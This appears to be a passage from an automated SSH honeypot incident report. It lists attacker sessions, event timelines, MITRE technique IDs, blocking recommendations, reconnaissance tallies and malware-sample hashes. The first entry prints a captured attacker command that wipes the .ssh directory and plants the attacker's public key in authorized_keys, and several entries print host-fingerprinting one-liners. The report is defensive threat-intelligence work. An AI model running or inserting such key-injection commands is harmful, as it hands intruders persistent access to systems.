| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:45:54` | `cowrie.session.connect` |
| `2026-08-08 04:45:54` | `cowrie.client.version` |
| `2026-08-08 04:45:54` | `cowrie.client.kex` |
| `2026-08-08 04:45:55` | `cowrie.login.success` |
| `2026-08-08 04:45:57` | `cowrie.session.params` |
| `2026-08-08 04:45:57` | `cowrie.command.input` |
| `2026-08-08 04:45:57` | `cowrie.command.failed` |
| `2026-08-08 04:45:57` | `cowrie.log.closed` |
| `2026-08-08 04:45:58` | `cowrie.session.params` |
| `2026-08-08 04:45:58` | `cowrie.command.input` |
| `2026-08-08 04:45:58` | `cowrie.session.file_download` |
| `2026-08-08 04:45:58` | `cowrie.log.closed` |
| `2026-08-08 04:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.93[.]39` to AbuseIPDB if not already reported
- [ ] Block `159.223.93[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a83d60198e3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.93[.]39` |
| **First Seen** | 2026-08-08 04:45 |
| **Last Seen** | 2026-08-08 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:45:58` | `cowrie.session.connect` |
| `2026-08-08 04:45:58` | `cowrie.client.version` |
| `2026-08-08 04:45:58` | `cowrie.client.kex` |
| `2026-08-08 04:45:59` | `cowrie.login.success` |
| `2026-08-08 04:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.93[.]39` to AbuseIPDB if not already reported
- [ ] Block `159.223.93[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a7ea9851fba

| Field | Detail |
|---|---|
| **Source IP** | `159.223.93[.]39` |
| **First Seen** | 2026-08-08 04:46 |
| **Last Seen** | 2026-08-08 04:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:46:00` | `cowrie.session.connect` |
| `2026-08-08 04:46:00` | `cowrie.client.version` |
| `2026-08-08 04:46:00` | `cowrie.client.kex` |
| `2026-08-08 04:46:02` | `cowrie.login.success` |
| `2026-08-08 04:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.93[.]39` to AbuseIPDB if not already reported
- [ ] Block `159.223.93[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0ad64a5c027

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:46 |
| **Last Seen** | 2026-08-08 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:46:00` | `cowrie.session.connect` |
| `2026-08-08 04:46:00` | `cowrie.client.version` |
| `2026-08-08 04:46:00` | `cowrie.client.kex` |
| `2026-08-08 04:46:01` | `cowrie.login.success` |
| `2026-08-08 04:46:01` | `cowrie.session.params` |
| `2026-08-08 04:46:01` | `cowrie.command.input` |
| `2026-08-08 04:46:02` | `cowrie.log.closed` |
| `2026-08-08 04:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd827cb215a2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:46 |
| **Last Seen** | 2026-08-08 04:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:46:45` | `cowrie.session.connect` |
| `2026-08-08 04:46:46` | `cowrie.client.version` |
| `2026-08-08 04:46:46` | `cowrie.client.kex` |
| `2026-08-08 04:46:47` | `cowrie.login.success` |
| `2026-08-08 04:46:49` | `cowrie.session.params` |
| `2026-08-08 04:46:49` | `cowrie.command.input` |
| `2026-08-08 04:46:49` | `cowrie.command.input` |
| `2026-08-08 04:46:49` | `cowrie.command.input` |
| `2026-08-08 04:46:49` | `cowrie.command.input` |
| `2026-08-08 04:46:49` | `cowrie.command.input` |
| `2026-08-08 04:46:49` | `cowrie.command.success` |
| `2026-08-08 04:46:49` | `cowrie.command.input` |
| `2026-08-08 04:46:49` | `cowrie.command.input` |
| `2026-08-08 04:46:49` | `cowrie.command.input` |
| `2026-08-08 04:46:49` | `cowrie.command.input` |
| `2026-08-08 04:46:49` | `cowrie.log.closed` |
| `2026-08-08 04:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f5848fdb27

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:47 |
| **Last Seen** | 2026-08-08 04:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:47:50` | `cowrie.session.connect` |
| `2026-08-08 04:47:50` | `cowrie.client.version` |
| `2026-08-08 04:47:50` | `cowrie.client.kex` |
| `2026-08-08 04:47:51` | `cowrie.login.success` |
| `2026-08-08 04:47:51` | `cowrie.session.params` |
| `2026-08-08 04:47:51` | `cowrie.command.input` |
| `2026-08-08 04:47:51` | `cowrie.log.closed` |
| `2026-08-08 04:47:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b2aaba602eb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:48 |
| **Last Seen** | 2026-08-08 04:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:48:40` | `cowrie.session.connect` |
| `2026-08-08 04:48:41` | `cowrie.client.version` |
| `2026-08-08 04:48:41` | `cowrie.client.kex` |
| `2026-08-08 04:48:42` | `cowrie.login.success` |
| `2026-08-08 04:48:44` | `cowrie.session.params` |
| `2026-08-08 04:48:44` | `cowrie.command.input` |
| `2026-08-08 04:48:44` | `cowrie.command.input` |
| `2026-08-08 04:48:44` | `cowrie.command.input` |
| `2026-08-08 04:48:44` | `cowrie.command.input` |
| `2026-08-08 04:48:44` | `cowrie.command.input` |
| `2026-08-08 04:48:44` | `cowrie.command.success` |
| `2026-08-08 04:48:44` | `cowrie.command.input` |
| `2026-08-08 04:48:44` | `cowrie.command.input` |
| `2026-08-08 04:48:44` | `cowrie.command.input` |
| `2026-08-08 04:48:44` | `cowrie.command.input` |
| `2026-08-08 04:48:44` | `cowrie.log.closed` |
| `2026-08-08 04:48:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ceb34d54b91

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:49 |
| **Last Seen** | 2026-08-08 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:49:39` | `cowrie.session.connect` |
| `2026-08-08 04:49:39` | `cowrie.client.version` |
| `2026-08-08 04:49:39` | `cowrie.client.kex` |
| `2026-08-08 04:49:40` | `cowrie.login.success` |
| `2026-08-08 04:49:41` | `cowrie.session.params` |
| `2026-08-08 04:49:41` | `cowrie.command.input` |
| `2026-08-08 04:49:41` | `cowrie.log.closed` |
| `2026-08-08 04:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1963777f60f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:50 |
| **Last Seen** | 2026-08-08 04:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:50:32` | `cowrie.session.connect` |
| `2026-08-08 04:50:32` | `cowrie.client.version` |
| `2026-08-08 04:50:32` | `cowrie.client.kex` |
| `2026-08-08 04:50:33` | `cowrie.login.success` |
| `2026-08-08 04:50:35` | `cowrie.session.params` |
| `2026-08-08 04:50:35` | `cowrie.command.input` |
| `2026-08-08 04:50:35` | `cowrie.command.input` |
| `2026-08-08 04:50:35` | `cowrie.command.input` |
| `2026-08-08 04:50:35` | `cowrie.command.input` |
| `2026-08-08 04:50:35` | `cowrie.command.input` |
| `2026-08-08 04:50:35` | `cowrie.command.success` |
| `2026-08-08 04:50:35` | `cowrie.command.input` |
| `2026-08-08 04:50:35` | `cowrie.command.input` |
| `2026-08-08 04:50:35` | `cowrie.command.input` |
| `2026-08-08 04:50:35` | `cowrie.command.input` |
| `2026-08-08 04:50:35` | `cowrie.log.closed` |
| `2026-08-08 04:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49f0e1fef777

| Field | Detail |
|---|---|
| **Source IP** | `155.212.17[.]174` |
| **First Seen** | 2026-08-08 04:51 |
| **Last Seen** | 2026-08-08 04:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:51:00` | `cowrie.session.connect` |
| `2026-08-08 04:51:00` | `cowrie.client.version` |
| `2026-08-08 04:51:00` | `cowrie.client.kex` |
| `2026-08-08 04:51:01` | `cowrie.login.success` |
| `2026-08-08 04:51:02` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.212.17[.]174` to AbuseIPDB if not already reported
- [ ] Block `155.212.17[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4830b527bbea

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:51 |
| **Last Seen** | 2026-08-08 04:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:51:32` | `cowrie.session.connect` |
| `2026-08-08 04:51:32` | `cowrie.client.version` |
| `2026-08-08 04:51:32` | `cowrie.client.kex` |
| `2026-08-08 04:51:33` | `cowrie.login.success` |
| `2026-08-08 04:51:34` | `cowrie.session.params` |
| `2026-08-08 04:51:34` | `cowrie.command.input` |
| `2026-08-08 04:51:34` | `cowrie.log.closed` |
| `2026-08-08 04:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-958b63511c25

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:52 |
| **Last Seen** | 2026-08-08 04:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:52:25` | `cowrie.session.connect` |
| `2026-08-08 04:52:25` | `cowrie.client.version` |
| `2026-08-08 04:52:25` | `cowrie.client.kex` |
| `2026-08-08 04:52:26` | `cowrie.login.success` |
| `2026-08-08 04:52:27` | `cowrie.session.params` |
| `2026-08-08 04:52:27` | `cowrie.command.input` |
| `2026-08-08 04:52:27` | `cowrie.command.input` |
| `2026-08-08 04:52:27` | `cowrie.command.input` |
| `2026-08-08 04:52:27` | `cowrie.command.input` |
| `2026-08-08 04:52:27` | `cowrie.command.input` |
| `2026-08-08 04:52:27` | `cowrie.command.success` |
| `2026-08-08 04:52:27` | `cowrie.command.input` |
| `2026-08-08 04:52:27` | `cowrie.command.input` |
| `2026-08-08 04:52:27` | `cowrie.command.input` |
| `2026-08-08 04:52:27` | `cowrie.command.input` |
| `2026-08-08 04:52:27` | `cowrie.log.closed` |
| `2026-08-08 04:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3faebe8d4b1e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:53 |
| **Last Seen** | 2026-08-08 04:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:53:21` | `cowrie.session.connect` |
| `2026-08-08 04:53:21` | `cowrie.client.version` |
| `2026-08-08 04:53:21` | `cowrie.client.kex` |
| `2026-08-08 04:53:22` | `cowrie.login.success` |
| `2026-08-08 04:53:22` | `cowrie.session.params` |
| `2026-08-08 04:53:22` | `cowrie.command.input` |
| `2026-08-08 04:53:22` | `cowrie.log.closed` |
| `2026-08-08 04:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca80e3f7f87a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:54 |
| **Last Seen** | 2026-08-08 04:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:54:19` | `cowrie.session.connect` |
| `2026-08-08 04:54:19` | `cowrie.client.version` |
| `2026-08-08 04:54:19` | `cowrie.client.kex` |
| `2026-08-08 04:54:20` | `cowrie.login.success` |
| `2026-08-08 04:54:21` | `cowrie.session.params` |
| `2026-08-08 04:54:21` | `cowrie.command.input` |
| `2026-08-08 04:54:21` | `cowrie.command.input` |
| `2026-08-08 04:54:21` | `cowrie.command.input` |
| `2026-08-08 04:54:21` | `cowrie.command.input` |
| `2026-08-08 04:54:21` | `cowrie.command.input` |
| `2026-08-08 04:54:21` | `cowrie.command.success` |
| `2026-08-08 04:54:21` | `cowrie.command.input` |
| `2026-08-08 04:54:21` | `cowrie.command.input` |
| `2026-08-08 04:54:21` | `cowrie.command.input` |
| `2026-08-08 04:54:21` | `cowrie.command.input` |
| `2026-08-08 04:54:22` | `cowrie.log.closed` |
| `2026-08-08 04:54:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **22** | 2026-08-08 03:05 | 2026-08-08 04:50 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `91.233.83[.]203` | **6** | 2026-08-08 03:32 | 2026-08-08 04:51 | 4m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-08 03:11 | 2026-08-08 04:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **4** | 2026-08-08 03:19 | 2026-08-08 04:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-08-08 03:41 | 2026-08-08 03:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-08-08 04:44 | 2026-08-08 04:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | **3** | 2026-08-08 04:00 | 2026-08-08 04:42 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `121.29.5[.]109` | **2** | 2026-08-08 04:54 | 2026-08-08 04:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]240` | **2** | 2026-08-08 04:20 | 2026-08-08 04:21 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.224[.]226` | **2** | 2026-08-08 04:54 | 2026-08-08 04:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]210` | **2** | 2026-08-08 03:36 | 2026-08-08 03:36 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-08-08 04:09 | 2026-08-08 04:09 | 5s | 0 | `T1592` | 🟢 LOW |
| `106.13.66[.]8` | 1 | 2026-08-08 04:32 | 2026-08-08 04:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]230` | 1 | 2026-08-08 03:56 | 2026-08-08 03:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-08-08 04:14 | 2026-08-08 04:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.238.41[.]121` | 1 | 2026-08-08 03:53 | 2026-08-08 03:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `187.212.37[.]143` | 1 | 2026-08-08 04:47 | 2026-08-08 04:47 | 13s | 0 | `T1592` | 🟢 LOW |
| `190.97.239[.]29` | 1 | 2026-08-08 03:36 | 2026-08-08 03:37 | 11s | 0 | `T1592` | 🟢 LOW |
| `213.66.196[.]11` | 1 | 2026-08-08 03:15 | 2026-08-08 03:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.241.214[.]127` | 1 | 2026-08-08 03:51 | 2026-08-08 03:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `38.183.184[.]13` | 1 | 2026-08-08 03:38 | 2026-08-08 03:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-08-08 04:03 | 2026-08-08 04:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.7.197[.]30` | 1 | 2026-08-08 03:04 | 2026-08-08 03:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]148` | 1 | 2026-08-08 04:16 | 2026-08-08 04:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]108` | 1 | 2026-08-08 04:49 | 2026-08-08 04:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]107` | 1 | 2026-08-08 04:14 | 2026-08-08 04:14 | 2s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-08-08 03:36 | 2026-08-08 03:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]28` | 1 | 2026-08-08 04:03 | 2026-08-08 04:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]42` | 1 | 2026-08-08 04:18 | 2026-08-08 04:18 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
